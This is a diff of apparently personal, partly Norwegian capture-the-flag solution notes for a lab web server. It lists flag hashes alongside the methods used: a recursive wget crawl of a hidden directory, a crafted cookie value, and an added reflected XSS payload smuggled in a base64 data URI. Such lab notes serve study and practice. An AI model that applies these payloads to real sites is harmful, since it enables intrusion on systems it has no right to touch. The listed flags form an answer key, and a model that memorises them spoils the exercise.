@@ -4,7 +4,7 @@
 07: (wget -e robots=off  --recursive --no-parent --reject="index.html*" http://129.241.200.165:39972/.hidden/, så bruk bash scrip for  cate dem i rekkefølge inn i rett fil)
 09: 5be9ddc8c77921181cb9ab6e527c0fdc (i cookie 0000000000000000001dc9a8c7e805ebf7f73e63c940abdb03bffc6140f8a695)
 10alt: 9fe5b1212dad866d15abd9d29fc93da293f9a4ea9c67a0311f2e248b835f8
-
+14: 2d0a5e5fa25479364b502ea51a7b30c6 (http://129.241.200.165:39972/?page=media&src=data:text/html;base64,%20PHNjcmlwdD5hbGVydCgic3RhZ2UucG5nIik8L3NjcmlwdD4=)
 
 
 
